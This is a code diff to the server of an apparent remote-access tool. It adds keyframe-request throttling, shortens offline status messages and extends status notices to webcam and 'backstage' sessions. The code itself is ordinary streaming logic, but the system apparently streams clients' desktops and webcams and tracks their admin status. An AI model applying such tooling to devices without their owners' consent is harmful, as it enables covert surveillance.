@@ -131,6 +131,19 @@ const VIEWER_BACKPRESSURE_BYTES = Math.max(
   64 * 1024,
   Number(process.env.OVERLORD_MEDIA_VIEWER_BACKPRESSURE_BYTES || 512 * 1024),
 );
+export const MEDIA_BACKPRESSURE_VERSION = "1.0.0";
+const KEYFRAME_REQUEST_MIN_INTERVAL_MS = Math.max(
+  250,
+  Number(process.env.OVERLORD_MEDIA_KEYFRAME_MIN_INTERVAL_MS || 1000),
+);
+const rdKeyframeRequestedAt = new Map<string, number>();
+
+export function shouldRequestDesktopKeyframe(clientId: string, now = Date.now()): boolean {
+  const previous = rdKeyframeRequestedAt.get(clientId) || 0;
+  if (previous && now - previous < KEYFRAME_REQUEST_MIN_INTERVAL_MS) return false;
+  rdKeyframeRequestedAt.set(clientId, now);
+  return true;
+}
 
 type FrameBroadcastResult = {
   sent: boolean;
@@ -318,7 +331,7 @@ export function handleConsoleViewerOpen(ws: ServerWebSocket<SocketData>) {
     user: target?.user,
   });
   if (!target) {
-    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId: effectiveSessionId });
+    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client offline", sessionId: effectiveSessionId });
     return;
   }
 }
@@ -336,20 +349,28 @@ export function handleRemoteDesktopViewerOpen(ws: ServerWebSocket<SocketData>) {
   sessionManager.addRdSession(session);
   safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target, os: target?.os ?? "", isAdmin: !!target?.isAdmin });
   if (!target) {
-    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
+    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client offline", sessionId });
     return;
   }
   safeSendViewer(ws, { type: "status", status: "online", sessionId });
 }
 
 export function notifyRemoteDesktopStatus(clientId: string, status: string, reason?: string) {
+  const payloadReason = status === "offline" ? (reason || "Client offline") : reason;
+  const payload = (sessionId: string) => ({
+    type: "status" as const,
+    status,
+    reason: payloadReason,
+    sessionId,
+  });
   for (const session of sessionManager.getRdSessionsForClient(clientId)) {
-    safeSendViewer(session.viewer, {
-      type: "status",
-      status,
-      reason,
-      sessionId: session.id,
-    });
+    safeSendViewer(session.viewer, payload(session.id));
+  }
+  for (const session of sessionManager.getWebcamSessionsForClient(clientId)) {
+    safeSendViewer(session.viewer, payload(session.id));
+  }
+  for (const session of sessionManager.getbackstageSessionsForClient(clientId)) {
+    safeSendViewer(session.viewer, payload(session.id));
   }
 }
 
@@ -438,6 +459,14 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
         }
       }
       break;
+    case "desktop_request_keyframe": {
+      if (shouldRequestDesktopKeyframe(clientId)) {
+        sendDesktopCommand(target, "desktop_request_keyframe", {
+          reason: String((payload as any).reason || "viewer_request"),
+        });
+      }
+      break;
+    }
     case "desktop_stop": {
       const otherViewers = sessionManager.getRdSessionsForClient(clientId)
         .filter(s => s.id !== ws.data.sessionId);
@@ -456,6 +485,7 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
           rdStreamingState.set(clientId, { ...state, isStreaming: false, startedAt: 0, lastFrameAt: 0 });
           logger.debug(`[rd] stop requested while not streaming for client ${clientId}`);
         }
+        rdKeyframeRequestedAt.delete(clientId);
       } else {
         logger.debug(`[rd] ignoring desktop_stop for client ${clientId} - ${otherViewers.length} other viewer(s) still active`);
       }
@@ -776,7 +806,7 @@ function broadcastRemoteDesktopFrame(clientId: string, bytes: Uint8Array, header
   const buf = buildViewerFrameBuffer(bytes, header);
   const sessions = sessionManager.getRdSessionsForClient(clientId);
   const result = broadcastFrameToViewers(sessions, buf, header);
-  if (result.dropped) {
+  if (result.dropped && shouldRequestDesktopKeyframe(clientId)) {
     const target = clientManager.getClient(clientId);
     if (target) {
       sendDesktopCommand(target, "desktop_request_keyframe", {
@@ -839,7 +869,7 @@ export function handleWebcamViewerOpen(ws: ServerWebSocket<SocketData>) {
   sessionManager.addWebcamSession(session);
   safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target, os: target?.os ?? "", isAdmin: !!target?.isAdmin });
   if (!target) {
-    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
+    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client offline", sessionId });
     return;
   }
   safeSendViewer(ws, { type: "status", status: "online", sessionId });
@@ -1155,7 +1185,7 @@ export function handlebackstageViewerOpen(ws: ServerWebSocket<SocketData>) {
   sessionManager.addbackstageSession(session);
   safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
   if (!target) {
-    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
+    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client offline", sessionId });
     return;
   }
   safeSendViewer(ws, { type: "status", status: "connecting", sessionId });
